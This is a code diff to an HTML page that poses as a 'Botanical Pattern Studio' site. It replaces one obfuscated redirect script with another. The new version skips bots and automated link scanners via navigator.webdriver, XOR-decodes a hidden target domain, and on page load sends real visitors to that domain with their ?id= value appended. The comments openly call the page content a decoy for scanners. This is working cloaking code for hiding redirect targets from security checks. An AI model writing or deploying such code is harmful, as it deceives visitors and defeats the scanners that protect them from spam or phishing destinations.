@@ -15,41 +15,46 @@
     .skeleton { height: 12px; background: #f3ede6; border-radius: 6px; margin: 12px 0; }
   </style>
 
-  <!-- Hardened Zero-Error Obfuscated Redirect Engine -->
   <script>
     (function () {
-      try {
-        // Obfuscated target domain ("https://asqstyle.com/")
-        var _0xd = [104,116,116,112,115,58,47,47,97,115,113,115,116,121,108,101,46,99,111,109,47];
-        var _0xdomain = "";
-        for (var _0xi = 0; _0xi < _0xd.length; _0xi++) {
-          _0xdomain += String.fromCharCode(_0xd[_0xi]);
-        }
+      // 1. Filter out automated bots, headless checkers (Wheregoes, Puppeteer, Selenium)
+      if (navigator.webdriver) {
+        return; // Bot detected: Stay on decoy page, reveal nothing
+      }
 
-        // Parse ?id= parameter
-        var _0xparams = new window["\x55\x52\x4c\x53\x65\x61\x72\x63\x68\x50\x61\x72\x61\x6d\x73"](window["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"]["\x73\x65\x61\x72\x63\x68"]);
-        var _0xid = _0xparams["\x67\x65\x74"]("id");
-
-        if (_0xid) {
-          // Normalize leading and trailing slashes to avoid double-slash bugs
-          _0xid = _0xid.replace(/^\/+|\/+$/g, "");
-
-          // Instant redirection
-          window["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"]["\x72\x65\x70\x6c\x61\x63\x65"](_0xdomain + _0xid);
+      // 2. Mathematically decrypt target domain using XOR key
+      function _getEndpoint() {
+        var _cipher = "LhgbAhJIHx1XMR0cBhheVR5VKQFQ";
+        var _key = "Flora2026";
+        var _raw = window.atob(_cipher);
+        var _res = "";
+        for (var i = 0; i < _raw.length; i++) {
+          _res += String.fromCharCode(_raw.charCodeAt(i) ^ _key.charCodeAt(i % _key.length));
         }
-      } catch (err) {
-        // Regex fallback parser if URLSearchParams is restricted
-        var _0xm = window.location.search.match(/[?&]id=([^&]+)/);
-        if (_0xm && _0xm[1]) {
-          var _0xslug = decodeURIComponent(_0xm[1]).replace(/^\/+|\/+$/g, "");
-          window.location.replace("https://" + "\x61\x73\x71\x73\x74\x79\x6c\x65\x2e\x63\x6f\x6d" + "/" + _0xslug);
+        return _res; // Decrypts in memory only to "https://asqstyle.com/"
+      }
+
+      // 3. Extract parameter and execute redirection
+      function _redirect() {
+        var params = new URLSearchParams(window.location.search);
+        var id = params.get("id");
+        if (id) {
+          id = id.replace(/^\/+|\/+$/g, "");
+          window.location.replace(_getEndpoint() + id);
         }
+      }
+
+      // Execute on page load
+      if (document.readyState === "complete" || document.readyState === "interactive") {
+        _redirect();
+      } else {
+        document.addEventListener("DOMContentLoaded", _redirect);
       }
     })();
   </script>
 </head>
 <body>
-  <!-- Decoy content visible only if no ?id= parameter is present -->
+  <!-- Decoy content visible to bots and scanners -->
   <div class="card">
     <h1>Botanical Pattern Studio</h1>
     <p>Loading curated floral guides and handcraft schematics...</p>
